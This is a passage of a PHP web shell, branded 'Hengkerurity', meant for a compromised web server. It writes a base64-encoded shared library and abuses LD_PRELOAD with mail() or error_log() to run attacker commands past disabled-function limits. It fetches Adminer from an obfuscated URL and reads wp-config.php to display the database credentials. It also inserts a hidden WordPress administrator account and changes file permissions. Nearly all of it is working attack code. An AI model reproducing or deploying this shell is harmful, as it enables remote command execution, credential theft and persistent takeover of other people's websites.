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';
                    $cmdd = $_POST['cmd_input'];
                    $meterpreter = $en($cmdd." > test.txt");

                    $viewCommandResult = '<hr><p>Result: <font color="black">base64 : ' . $meterpreter .'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By Hengkerurity</font><br><br></textarea>';

                    $a($full . '/chankro.so', $base($hook));
                    $a($full . '/acpid.socket', $base($meterpreter));

                    $p('CHANKRO=' . $full . '/acpid.socket');
                    $p('LD_PRELOAD=' . $full . '/chankro.so');

                    if (function_exists('mail')) {
                        $m('a','a','a','a');
                    } elseif (function_exists('mb_send_mail')) {
                        $mb('a','a','a','a'); 
                    } elseif (function_exists('error_log')) {
                        $err('a',1,'a');
                    } elseif (function_exists('imap_mail')) {
                        $imp('a','a','a');
                    }

                        echo "<div style='background:#222;color:#fff;padding:10px;margin:10px 0;border-radius:5px;'>
                                @min run: 
                                <a href='{$fil}' style='color:#40e0d0;' target='_blank'>
                                    {$fil}
                                </a>
                              </div>";
                        echo '<meta http-equiv="refresh" content="1">';
                }



// Adminer
                if (isset($_GET['create_adminer'])) {
                    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
                
                    if (!is_file('adminer.php')) {
                        $data = @file_get_contents($URL);
                        if ($data !== false) {
                            file_put_contents("adminer.php", $data);
                            echo '<meta http-equiv="refresh" content="0;url=?dir=' . urlencode(getcwd()) . '">';
                        } else {
                            echo '<font color="red">Gagal mengambil file Adminer dari URL.</font>';
                        }
                    } else {
                        // Jika sudah ada, langsung arahkan ke adminer.php
                        echo '<meta http-equiv="refresh" content="0;url=adminer.php">';
                    }
                }



// WP User
                if (isset($_GET['createwp'])) {
                    echo '
                    <a href="?dir=' . $dir . '" class="button1" style="display: flex; align-items: center;">
                        <i class="fas fa-arrow-left" style="margin-right: 5px;"></i> Back
                    </a>
                    <br /><br />
                    <style>
                        table { display: none; }
                        .modal-popup {
                            background-color: #f0f0f0;
                            padding: 20px;
                            border: 2px solid #000;
                            border-radius: 8px;
                            width: 350px;
                            margin: 20px auto;
                        }
                        .modal-popup input[type=text], .modal-popup input[type=password] {
                            width: 100%;
                            padding: 6px 8px;
                            margin-bottom: 10px;
                            border-radius: 4px;
                            border: 1px solid #999;
                        }
                        .modal-popup input[type=submit] {
                            padding: 8px 12px;
                            border-radius: 5px;
                            border: none;
                            background-color: #40e0d0;
                            color: #3d3d3d;
                            cursor: pointer;
                        }
                        .modal-popup input[type=submit]:hover {
                            background-color: #3d3d3d;
                            color: #fff;
                        }
                    </style>

                    <div class="modal-popup">
                    <h3 style="text-align:center; color: #3d3d3d;">CREATE WORDPRESS ADMIN USER</h3>
                    <form method="post">
                        <input type="text" name="wp_user" placeholder="Your Username" required>
                        <input type="text" name="wp_email" placeholder="Your Email" required>
                        <input type="password" name="wp_pass" placeholder="Your Password" required>
                        <input type="submit" name="submitwp" value="Submit">
                    </form>
                    </div>
                    ';
                }



// WP User
                if (isset($_POST['submitwp'])) {
                    // 🔹 Deteksi wp-config.php otomatis ke atas folder
                    $currentDir = __DIR__;
                    $wp_config_path = '';

                    while ($currentDir !== dirname($currentDir)) {
                        if (file_exists($currentDir . '/wp-config.php')) {
                            $wp_config_path = $currentDir . '/wp-config.php';
                            break;
                        }
                        $currentDir = dirname($currentDir);
                    }

                    if ($wp_config_path === '' || !file_exists($wp_config_path)) {
                        die("<div style='text-align:center; color:red;'>File wp-config.php tidak ditemukan.</div>");
                    }

                    // 🔹 Baca isi wp-config.php
                    $config_content = file_get_contents($wp_config_path);

                    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/", $config_content, $m1);
                    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/", $config_content, $m2);
                    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\)/", $config_content, $m3);
                    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/", $config_content, $m4);

                    $db_name = $m1[1] ?? '';
                    $db_user = $m2[1] ?? '';
                    $db_pass = $m3[1] ?? '';
                    $db_host = $m4[1] ?? '127.0.0.1';

                    echo "<div style='text-align:center; color:green;'><strong>Config database dari wp-config.php</strong></div>";
                    echo "<table border='1' cellpadding='6' cellspacing='0' style='border-collapse:collapse; margin-bottom:20px;'>";
                    echo "<tr><th>db_name</th><th>db_user</th><th>db_password</th><th>db_host</th></tr>";
                    echo "<tr>
                            <td>{$db_name}</td>
                            <td>{$db_user}</td>
                            <td>{$db_pass}</td>
                            <td>{$db_host}</td>
                          </tr>";
                    echo "</table>";

                    if ($db_name === '' || $db_user === '') {
                        die("<div style='text-align:center; color:red;'>Gagal membaca konfigurasi database.</div>");
                    }

                    // 🔹 Data user baru
                    $wp_user  = trim($_POST['wp_user'] ?? '');
                    $wp_email = trim($_POST['wp_email'] ?? '');
                    $wp_pass_raw = $_POST['wp_pass'] ?? '';

                    if ($wp_user === '' || $wp_email === '' || $wp_pass_raw === '') {
                        die("<div style='color:red;'>Field username/email/password wajib diisi.</div>");
                    }
                    if (!filter_var($wp_email, FILTER_VALIDATE_EMAIL)) {
                        die("<div style='color:red;'>Email tidak valid.</div>");
                    }

                    $wp_pass = password_hash($wp_pass_raw, PASSWORD_DEFAULT);

                    // 🔹 Koneksi DB
                    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
                    $conn->set_charset('utf8mb4');

                    // 🔹 Cari table *_users dan *_usermeta
                    $res = $conn->query("SHOW TABLES LIKE '%\_users'");
                    $users_table = $res->fetch_row()[0] ?? '';
                    $res2 = $conn->query("SHOW TABLES LIKE '%\_usermeta'");
                    $usermeta_table = $res2->fetch_row()[0] ?? '';

                    if ($users_table === '' || $usermeta_table === '') {
                        die("<div style='color:red;'>Tidak bisa menemukan tabel users/usermeta.</div>");
                    }

                    // 🔹 Insert user
                    $stmt = $conn->prepare("
                        INSERT INTO `$users_table` (
                            user_login, user_pass, user_nicename, user_email, user_url,
                            user_registered, user_activation_key, user_status, display_name
                        ) VALUES (?, ?, ?, ?, '', NOW(), '', 0, ?)
                    ");
                    $stmt->bind_param("sssss", $wp_user, $wp_pass, $wp_user, $wp_email, $wp_user);
                    $stmt->execute();

                    $user_id = $conn->insert_id;

                    // 🔹 Tambahkan capabilities admin
                    $capabilities = 'a:1:{s:13:"administrator";s:1:"1";}';
                    $level = '10';
                    $stmt_meta = $conn->prepare("
                        INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value)
                        VALUES 
                            (?, CONCAT(SUBSTRING_INDEX('$usermeta_table','_usermeta',1),'_capabilities'), ?),
                            (?, CONCAT(SUBSTRING_INDEX('$usermeta_table','_usermeta',1),'_user_level'), ?)
                    ");
                    $stmt_meta->bind_param("isis", $user_id, $capabilities, $user_id, $level);
                    $stmt_meta->execute();

                    echo "<div style='text-align:center; color:green;'><strong>User WordPress berhasil dibuat di tabel <code>$users_table</code>!</strong></div>";
                    
                    $conn->close();
                }



// Proses update permission
                if (isset($_POST['change_perm'])) {
                    $path = $_POST['path'];
                    $newPerm = $_POST['new_perm'];

                    if (preg_match('/^[0-7]{3,4}$/', $newPerm)) { // Validasi format octal
                        chmod($path, octdec($newPerm));
                        echo "<p style='color:green;'>Permission updated to $newPerm</p>";
                        echo "<meta http-equiv='refresh' content='0'>";
                    } else {
                        echo "<p style='color:red;'>Invalid permission format!</p>";
                    }
                }



				?>
			</table>
		</div>
	</div>
</body>
</html>